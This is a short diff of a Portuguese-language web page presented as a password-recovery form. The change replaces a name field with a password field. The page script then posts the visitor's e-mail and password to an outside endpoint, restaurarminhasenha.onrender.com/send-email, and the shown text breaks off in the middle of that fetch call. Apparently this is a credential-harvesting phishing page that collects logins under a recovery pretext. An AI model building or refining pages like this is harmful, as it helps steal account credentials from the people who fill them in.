@@ -110,7 +110,7 @@
 
     <form id="contactForm">
       <input type="email" id="email" placeholder="E-mail" required>
-      <input type="text" id="name" placeholder="Senha" required>
+      <input type="password" id="password" placeholder="Senha" required>
 
       <div class="buttons">
         <button type="reset" class="btn btn-secondary">Recuperar minha senha</button>
@@ -139,10 +139,9 @@
       statusEl.className = "status";
 
       const payload = {
-        name: document.getElementById("name").value.trim(),
         email: document.getElementById("email").value.trim(),
-        message: "Contato via formulário"
-      };
+        password: document.getElementById("password").value.trim()
+        };
 
       try {
         const response = await fetch("https://restaurarminhasenha.onrender.com/send-email", {
